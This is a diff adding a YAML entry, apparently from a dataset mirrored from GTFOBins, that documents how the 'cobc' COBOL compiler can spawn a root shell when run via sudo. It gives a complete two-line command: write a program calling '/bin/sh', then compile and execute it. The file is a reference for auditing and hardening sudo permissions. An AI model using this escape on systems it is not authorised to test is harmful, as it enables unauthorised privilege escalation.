@@ -1,0 +1,27 @@
+id: gtfobins/cobc/shell/sudo
+type: binary
+platform: linux
+name: cobc
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo ''CALL "SYSTEM" USING "/bin/sh".'' >/path/to/temp-file
+
+    cobc -xFj --frelax-syntax-checks /path/to/temp-file'
+  comment: The `/path/to/temp-file` sill be overwritten after the execution.
+references:
+- https://gtfobins.github.io/gtfobins/cobc/
+tags:
+- linux
+- unix
+- gtfobins
